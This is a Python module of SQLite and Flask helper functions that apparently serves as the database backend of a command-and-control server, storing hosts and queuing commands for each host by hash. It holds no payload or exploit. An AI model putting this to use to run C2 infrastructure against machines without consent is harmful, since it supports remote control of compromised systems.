#!/usr/bin/env python3

import sqlite3
from sqlite3 import Error
from flask import jsonify

# ===============================================
def create_connection(db_file):
	conn = None
	try:
		conn = sqlite3.connect(db_file)
		print("[i] Database connection ...OK")
	except Error as e:
		print(e)

	return conn
# ===============================================

# get db object
# ===============================================
def get_db():
	database = r"c2.db"
	conn = create_connection(database)
	return conn
# ===============================================

# create tables
# ===============================================
def create_table(conn, create_table_sql):
	try:
		c = conn.cursor()
		c.execute(create_table_sql)
	except Error as e:
		print(e)
# ===============================================


# select query
# ===============================================
def select_db(conn, sql, params):
	cursor = conn.cursor()
	cursor.execute(sql, params)
	rows = cursor.fetchall()

	return rows
# ===============================================


# insert statement
# ===============================================
def insert_db(conn, sql, params):
	cursor = conn.cursor()
	cursor.execute(sql, params)
	conn.commit()

	return cursor.lastrowid
# ===============================================










# ===============================================
# APP-ORIENTED FUNCTIONS
# ===============================================

# get hosts
# ===============================================
def api_get_hosts():
	conn = get_db()

	hosts = select_db(conn, "SELECT * FROM hosts", ())
	return jsonify(hosts)
# ===============================================


# get commands by host id
# ===============================================
def api_get_command(host_id):
	conn = get_db()
	print(host_id)
	commands = select_db(conn, "SELECT * FROM commands WHERE fk_host_id = ?", (host_id,))

	return jsonify(commands)
# ===============================================




# add command by host hash
# ===============================================
def api_add_command(host_hash, cmd):
	conn = get_db()

	host_id = select_db(conn, "SELECT host_id FROM hosts WHERE hash = ?", (host_hash,))

	success = insert_db(conn, "INSERT INTO commands(command, fk_host_id) VALUES (?,?)", (cmd, host_id[0][0]));
	return str(success)
# ===============================================
